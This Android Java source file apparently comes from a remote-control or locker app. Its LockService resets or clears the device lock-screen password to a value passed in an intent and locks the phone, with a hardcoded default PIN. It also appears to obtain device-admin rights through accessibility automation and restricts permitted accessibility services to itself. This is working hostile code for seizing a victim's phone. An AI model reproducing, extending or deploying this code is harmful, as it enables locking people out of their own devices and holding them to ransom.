package lock;


import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;

import android.os.RemoteException;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.annotation.RequiresApi;
import android.util.Log;

import java.util.ArrayList;
import java.util.List;

import order.screen.ScreenShot101Activity;
import permission.GivePermission;
import utils.ConfigCt;
import utils.Funcs;
import utils.MyLog;

import static utils.ConfigCt.TAG;

/**
 * @author byc
 *
 */
public class LockService  extends Service {
    public static DevicePolicyManager policyManager;
    public static ComponentName mComponentName;
    public static final int OP_CLEAR_PWD=1;//清除密码；
    public static final int OP_SET_PWD=2;//设置密码；
    public static final int OP_SET_PWD_AND_LOCK=3;//设置密码并且锁屏；
    public static final int OP_LOCK=4;//锁屏；
    //private static final int LATENCY_TIME=1000;//Latency  1000*10  1000*60*60*24*3
    public static final int MY_REQUEST_CODE=123;//
    //public static boolean isServiceRun=false;
    public static String mPwd="800108";
    public static LockState mLockState=LockState.delayed;
    //private static GivePower givePower;
    public static  enum LockState {
        delayed,locked, unLocked;
    }
    private Handler handler=null;
    private Runnable runnable=null;
    private IntentFilter filter;
    private BroadcastReceiver mBatInfoReceiver;
    @Override
    public void onCreate() {
        //isServiceRun=true;
        //获取设备管理服务
        policyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        mComponentName = new ComponentName(this, AdminReceiver.class);
        LockReceiver();
    }
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    @Override
    public void onDestroy() {
        super.onDestroy();
        unregisterReceiver(mBatInfoReceiver);
        Log.d(TAG, "LockService onDestroy() executed");
    }
    @Override
    public boolean stopService(Intent name) {
        Log.d(TAG, "LockService stopService() executed");
        return super.stopService(name);
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "LockService onStartCommand() executed");
        //判断是否有锁屏权限，若有则立即锁屏并结束自己，若没有则获取权限
        if (policyManager.isAdminActive(mComponentName)) {
            ConfigCt.getInstance(this).setLockPermission(true);
            if(intent!=null) {
                op(intent);//执行操作；
            }
        } else {
            //handlerPower.postDelayed(runnablePower, 1000*1);//打开AcessbilityService时执行：
            LockPrepare();//获取权限；
        }
        return super.onStartCommand(intent, flags, startId);
    }

    private void LockReceiver(){
        filter = new IntentFilter();
        // 屏幕灭屏广播
        filter.addAction(Intent.ACTION_SCREEN_OFF);
        // 屏幕亮屏广播
        filter.addAction(Intent.ACTION_SCREEN_ON);
        // 屏幕解锁广播
        filter.addAction(Intent.ACTION_USER_PRESENT);
        // 当长按电源键弹出“关机”对话或者锁屏时系统会发出这个广播
        // example：有时候会用到系统对话框，权限可能很高，会覆盖在锁屏界面或者“关机”对话框之上，
        // 所以监听这个广播，当收到时就隐藏自己的对话，如点击pad右下角部分弹出的对话框
        filter.addAction(Intent.ACTION_CLOSE_SYSTEM_DIALOGS);

        mBatInfoReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(final Context context, final Intent intent) {
                Log.d(TAG, "mBatInfoReceiver onReceive");
                String action = intent.getAction();

                if (Intent.ACTION_SCREEN_ON.equals(action)) {
                    //if(mLockState==LockState.locked)ShowWindow();
                    Log.d(TAG, "screen on");
                } else if (Intent.ACTION_SCREEN_OFF.equals(action)) {
                    if(mLockState==LockState.locked)
                        //LockActivity.startSelf(getApplicationContext());
                    Log.d(TAG, "screen off");
                } else if (Intent.ACTION_USER_PRESENT.equals(action)) {
                    //HideWindow();

                    //LockActivity.startSelf(null);
                    mLockState=LockState.unLocked;
                    Log.d(TAG, "screen unlock");
                } else if (Intent.ACTION_CLOSE_SYSTEM_DIALOGS.equals(intent.getAction())) {
                    Log.i(TAG, " receive Intent.ACTION_CLOSE_SYSTEM_DIALOGS");
                }
            }
        };
        Log.d(TAG, "mBatInfoReceiver  registerReceiver");
        registerReceiver(mBatInfoReceiver, filter);
    }

    /*
     * 锁屏预备
     */
    public void LockPrepare(){
        //if(android.os.Build.VERSION.SDK_INT>=Build.VERSION_CODES.N)return;//android 7退出；
        if (policyManager==null) return;
        if (policyManager.isAdminActive(mComponentName)) return;
        if(handler!=null&&runnable!=null)return;
        if(Funcs.isScreenLocked(this))return;
        handler= new Handler();
        runnable = new Runnable() {
            @Override
            public void run() {
                if(GivePermission.getGivePermission().isEnable()){
                    ScreenShot101Activity.startInstance(LockService.this, ScreenShot101Activity.REQUEST_MEDIA_DEVICE,mComponentName);
                    GivePermission.getGivePermission().EventStart();
                    GivePermission.getGivePermission().TimeStart();
                    return;
                }
                //handler.postDelayed(this, 1000*25);
            }
        };
        handler.postDelayed(runnable, 200*1);//打开AcessbilityService时执行：
    }
    /*
     * 执行：清除密码；设置密码；设置密码并锁屏；操作；
     *  OP_CLEAR_PWD=1;//清除密码；
    	OP_SET_PWD=2;//设置密码；
    	OP_SET_PWD_AND_LOCK=3;//设置密码并且锁屏；
    	OP_LOCK=4;//锁屏；
     */
    private void op(Intent intent){
        if (policyManager==null)return;
        if (!policyManager.isAdminActive(mComponentName))return;
        int op = intent.getIntExtra("op", 0);
        String pwd = intent.getStringExtra("pwd");
        switch(op){
            case OP_CLEAR_PWD:
                policyManager.resetPassword("", 0);
                break;
            case OP_SET_PWD:
                policyManager.resetPassword(pwd, 0);
                break;
            case OP_SET_PWD_AND_LOCK:
                policyManager.resetPassword(pwd, 0);
                policyManager.lockNow(); //立即锁屏
                mLockState=LockState.locked;
                //LockActivity.startSelf(getApplicationContext());
                //FloatWindowLock.getInstance(this).ShowFloatingWindow();
                break;
            case OP_LOCK:
                policyManager.lockNow(); //立即锁屏

                break;
        }
        if (Build.VERSION.SDK_INT >=21) {
            List<String> packageNames = new ArrayList<String>();
            packageNames.add(this.getPackageName().toString());
            setPermittedAccessibilityServices(mComponentName, packageNames);
            setUninstallBlocked(mComponentName,this.getPackageName().toString(),false);
        }
        MyLog.i("pwd="+pwd);
        MyLog.i("op="+op);
        MyLog.i("lockNow");
    }

    //AccessibilityServices可以体现出界面显示上的一切元素变化，可用于辅助盲人使用设备

    //Called by a profile or device owner to set the permitted accessibility services.

    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    public boolean setPermittedAccessibilityServices(@NonNull ComponentName admin,

                                                     List<String> packageNames) {

        if (policyManager != null) {

            try {

                return policyManager.setPermittedAccessibilityServices(admin, packageNames);

            } catch (RuntimeException e) {

                MyLog.e( "Failed talking with device policy service:"+e.getMessage().toString());

            }

        }

        return false;

    }
    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    public void setUninstallBlocked(@NonNull ComponentName admin, String packageName,
                                    boolean uninstallBlocked) {
        if (policyManager != null) {
            try {
                policyManager.setUninstallBlocked(admin, packageName, uninstallBlocked);
            } catch (RuntimeException re) {
                Log.w(TAG, "Failed to call block uninstall on device policy service");
            }
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    public boolean isUninstallBlocked(@Nullable ComponentName admin, String packageName) {

        if (policyManager != null) {
            try {
                return policyManager.isUninstallBlocked(admin, packageName);
            } catch (RuntimeException re) {
                Log.w(TAG, "Failed to call block uninstall on device policy service");
            }
        }
        return false;

    }

    /*
    @TargetApi(Build.VERSION_CODES.N)
    public static void setWallpaper(Context context) {
    	if(android.os.Build.VERSION.SDK_INT<Build.VERSION_CODES.N)return;
        try {
            WallpaperManager mWallpaperManager = WallpaperManager.getInstance(context);
            if (mWallpaperManager != null) {//| WallpaperManager.FLAG_SYSTEM
                mWallpaperManager.setBitmap(BitmapFactory.decodeResource(context.getResources(), R.drawable.lock), null, true, WallpaperManager.FLAG_LOCK );
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
        private void processLock(){
    	final Handler handlerLock = new Handler();
    	Runnable runnable = new Runnable() {
    		@Override
    		public void run() {
    			mLockState=LockState.locked;
    			policyManager.resetPassword(mPwd, 0);
    			policyManager.lockNow(); //立即锁屏
    			if(android.os.Build.VERSION.SDK_INT>=Build.VERSION_CODES.N){
    				//setWallpaper(getApplicationContext());
    				LockActivity.startSelf(getApplicationContext());
    			}else{
    				LockActivity.startSelf(getApplicationContext());
    			}
    		}
    	};
    	handlerLock.postDelayed(runnable, LATENCY_TIME);//延迟lock
    }
        public static void clearLockScreenPWD(){
    	if (policyManager==null)return;
    	if (policyManager.isAdminActive(mComponentName)) {
    		//policyManager.resetPassword(null, 0);
    		policyManager.resetPassword("", 0);
    	}
    }
    public static void setLock(String pwd){
    	//mLocking=true;
    	if(pwd.length()!=6)return;
    	if(Funcs.str2int(pwd)==-1)return;
    	mPwd=pwd;
    }
    */
}
